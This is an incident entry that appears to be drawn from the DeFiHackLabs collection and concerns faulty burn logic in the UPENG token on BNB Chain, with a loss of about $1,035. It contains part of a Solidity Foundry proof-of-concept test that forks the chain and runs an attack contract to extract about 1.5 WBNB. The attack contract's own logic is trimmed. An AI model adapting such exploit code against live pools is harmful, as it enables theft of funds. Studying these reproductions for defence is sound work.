# [?] UPENG - Incorrect Burn Logic

## Summary
Severity: Unknown
Chain: BNB Chain
Component: UPENGBurnSync
Published: 2025-07-13
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/UPENGBurnSync_exp.sol
Type: defi-exploit-poc

## Details
Lost: $1,035.06

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    address private profitReceiver;

    function setUp() public {
        vm.createSelectFork("bsc", 53_877_710);

        profitReceiver = makeAddr("profitReceiver");
        fundingToken = WBNB_TOKEN;
        attacker = profitReceiver;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(UPENG_TOKEN, "UPENG");
        vm.label(UPENG_WBNB_PAIR, "UPENG/WBNB Pair");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public balanceLog {
        _assertPairLayout();

        vm.deal(address(this), SEED_BNB);
        uint256 wbnbBefore = IERC20(WBNB_TOKEN).balanceOf(profitReceiver);

        UPENGBurnSyncAttack attack = new UPENGBurnSyncAttack(profitReceiver);
        attack.execute{value: SEED_BNB}();

        uint256 profit = IERC20(WBNB_TOKEN).balanceOf(profitReceiver) - wbnbBefore;
        assertGt(profit, 1.49 ether);
        assertLt(profit, 1.51 ether);
    }

    function _assertPairLayout() private {
        assertEq(ISyncSwapPair(UPENG_WBNB_PAIR).token0(), UPENG_TOKEN);
        assertEq(ISyncSwapPair(UPENG_WBNB_PAIR).token1(), WBNB_TOKEN);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/UPENGBurnSync_exp.sol_
